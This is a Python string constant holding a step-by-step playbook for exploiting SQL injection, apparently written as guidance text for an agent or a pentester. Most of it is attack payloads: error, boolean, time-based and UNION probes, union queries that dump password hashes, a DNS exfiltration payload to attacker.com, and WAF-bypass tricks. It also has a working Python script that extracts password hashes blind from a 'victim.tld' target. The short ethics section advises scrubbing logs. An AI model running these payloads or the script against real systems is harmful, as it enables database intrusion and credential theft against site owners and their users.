SQL_GUIDE_O3 = """
**A Decision-Tree Playbook for Exploiting SQL-Injection Vulnerabilities**
*(structured as observation → follow-up actions; covers error-based, union-based, boolean/time-based, stacked & OOB techniques; engine-agnostic)*

---

### 0. Recon & Setup

| Goal               | Actions                                                                                                                                                                                                                  | Notes                                                                                 |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------- |
| Map attack surface | • Identify every endpoint that **reflects external input into a SQL query** (URLs, JSON, HTTP headers, cookies, body params).<br>• Record HTTP method, content-type, baseline status code, response length, and latency. | Build a tiny wrapper (e.g., `requests` in Python) so you can replay payloads quickly. |
| Normalise baseline | • Send the same benign request 3-5 times.<br>• Store mean latency & response size.                                                                                                                                       | Used later to spot timing gaps / boolean differences.                                 |

---

### 1. First-Wave “Does Anything Break?” Tests

**Observation 1.1** – Inject single-quote variations into *every* parameter one at a time:

```
'    "    \    %27    %22
```

*If* the server returns **HTTP 500 / stack trace / SQL error text** → **goto 2.a (Error-based path)**.
*Else* continue.

**Observation 1.2** – Inject tautologies and anti-tautologies:

| Test             | Control           |
| ---------------- | ----------------- |
| `foo' OR '1'='1` | `foo' AND '1'='2` |

Compare response length / structure.

*If* the two responses differ meaningfully (length, rendered records, JSON count) → **goto 2.b (Boolean-based path)**.
*Else* continue.

**Observation 1.3** – Latency probe (time-based):

```
foo'||(SELECT pg_sleep(5))--
foo' WAITFOR DELAY '0:0:5'--
foo' AND 1=IF(1,SLEEP(5),0)--
```

Measure elapsed time − baseline.

*If* > 4 s gap appears → **goto 2.c (Time-based path)**.
*Else* continue.

**Observation 1.4** – UNION echo probe:

```
foo' UNION SELECT NULL--
foo' UNION SELECT NULL,NULL--
...
```

Increase number of `NULL` columns until error disappears.

*If* one variant returns **HTTP 200 plus normal page** → **goto 2.d (UNION path)**.
*Else* continue.

If **all** of 1.1–1.4 fail, attempt **stacked queries** (`;SELECT 1;--`) and **comment styles** (`--`, `#`, `/* … */`). No joy? Move to 2.e (OOB).

---

### 2. Exploit Paths

#### 2.a Error-Based

1. **Fingerprint DBMS** from error string (look for `SQLite`, `MySQL`, `PostgreSQL`, `SQL Server` clues).
2. **Leverage verbose errors** to enumerate schema:<br>

   * *MySQL / SQLite:* `foo' AND (SELECT 1/0)--`<br>
   * *Postgres:* `foo' AND (SELECT cast(1 as int)/0)--`
3. **Iterative plan**

   | Observation                                   | Next move                                                         |
   | --------------------------------------------- | ----------------------------------------------------------------- |
   | Error shows *table does not exist*            | Guess table name (`users`, `accounts`, etc.) until error changes. |
   | Error shows *incorrect column count* on UNION | Adjust `NULL` count until error clears.                           |
4. After aligning column count, **UNION-select desired columns**: username, password\_hash, etc.

#### 2.b Boolean-Based (Blind)

1. **Choose yes/no question**: *Does the first user id = 1?*
2. **Craft payload template** (MySQL style):

```
whatever' AND (SELECT CASE WHEN (<predicate>) THEN 1 ELSE 0 END) AND '1'='1
```

3. **Binary search each value**

   * Example character extraction:

     ```
     ascii(substr((SELECT password FROM users LIMIT 1 OFFSET 0),1,1)) > 77
     ```
   * Compare response length; adjust high/low.
4. **Automate** until full hash retrieved.
   (Write loop; 25–30 req/sec is usually safe.)

#### 2.c Time-Based Blind

1. Same predicates as 2.b but trigger a delay:

```
' AND IF(<predicate>, SLEEP(5), 0)--            -- MySQL
' ; SELECT CASE WHEN <predicate> THEN pg_sleep(5) END--  -- PostgreSQL
```

2. Binary search as above but watch `elapsed > 4 s`.

#### 2.d UNION-Based

> *Prereq: number of columns known from 1.4.*

1. **Find printable column**

   * Replace each `NULL` one at a time with static text (`'QWERTY'`) until it appears in response.
   * Mark its index – that’s your “visible” column.
2. **Schema guessing loop**

   | Step                | Payload example                                                                               |
   | ------------------- | --------------------------------------------------------------------------------------------- |
   | List tables (MySQL) | `UNION SELECT table_name, NULL … FROM information_schema.tables--`                            |
   | List columns        | `UNION SELECT column_name, NULL … FROM information_schema.columns WHERE table_name='users'--` |
   | Dump data           | `UNION SELECT username, password_hash … FROM users--`                                         |
3. If quotes are filtered, use concatenation/operators (`UNION/*comment*/SELECT`) or different quoting (`0x71776572`).

#### 2.e Out-of-Band (OOB)

1. **DNS exfil:**

```
' UNION SELECT load_file(concat('//',username,'.attacker.com'))--
```

2. **HTTP exfil (MSSQL xp\_dirtree or MySQL outfile)** – requires loose DB settings; attempt last.

---

### 3. General Payload Hygiene

| Problem                    | Mitigation                                                             |
| -------------------------- | ---------------------------------------------------------------------- |
| Filtered single quotes `'` | Use double quotes `"`, backticks \` (MySQL), hex-encoded (`0x616263`). |
| Stripped spaces            | Replace with `/**/`, `+`, `%0a`.                                       |
| URL encoding               | Always test `%27`, `%2527` (double encode) variants.                   |
| WAF timeouts               | Add random comment blocks to bypass signature rules.                   |

---

### 4. Automation Skeleton (Python)

```python

# Minimal blind-SQLi enumerator (boolean & timing hybrid).
# Always use double quotes and tabs.

import requests, time, string

TARGET = "https://victim.tld/rest/search?q="
CHARSET = string.ascii_lowercase + string.digits + ":$"

def latency(payload: str) -> float:
	start = time.time()
	requests.get(TARGET + payload, timeout=15)
	return time.time() - start

def leak_char(pos: int) -> str:
	lo, hi = 32, 126  # printable ASCII range
	while lo < hi:
		mid = (lo + hi) // 2
		predicate = f"ascii(substr((SELECT password_hash FROM users LIMIT 1),{pos},1))>{mid}"
		payload = f"xyz' AND IF({predicate}, SLEEP(5), 0)--"
		if latency(payload) > 4:
			lo = mid + 1
		else:
			hi = mid
	return chr(lo)

hash_val = ""
for i in range(1, 33):		# typical 32-char hash
	char = leak_char(i)
	hash_val += char
	print(i, hash_val)
```

---

### 5. Stopping Conditions & Validation

* **Stop** once no more distinct usernames returned or `NULL` rows appear.
* **Validate** hashes: length matches algorithm (MD5 = 32-hex, bcrypt starts `$2b$`, PBKDF2 128 bits, etc.).
* Cross-check by logging in or by comparing with public wordlists (optional, ethics permitting).

---

### 6. Common Pitfalls

1. **Client-side filtering fooled you** – test raw requests, not just via browser.
2. **SQLite quirks** – no `information_schema`; use `sqlite_master`.
3. **Postgres uses `-- ` (double-dash-space)**; omit space and it ignores comment.
4. **MSSQL** – `UNION SELECT NULL` fails if datatypes mismatch; cast everything to `varchar`.
5. **Stacked queries** disabled by default on MySQL `<5.6` – rely on UNION or timing.

---

### 7. Ethics & Cleanup

* Obtain written permission for every target.
* Scrub logs or disclose responsibly.
* Never store credential hashes unencrypted; prove access, then delete.

---

#### Quick Path Selector (cheat sheet)

```
            START
              |
         quote error?
        /            \
     yes(2.a)        no
                     |
             union column count?
           /                      \
         yes(2.d)              no
                                |
                        bool diff or timing?
                       /               \
                     yes            out-of-band (2.e)
             (2.b/2.c)
```

Follow the branch until hashes (or data of interest) are exfiltrated. Iterate, automate, and adapt.

"""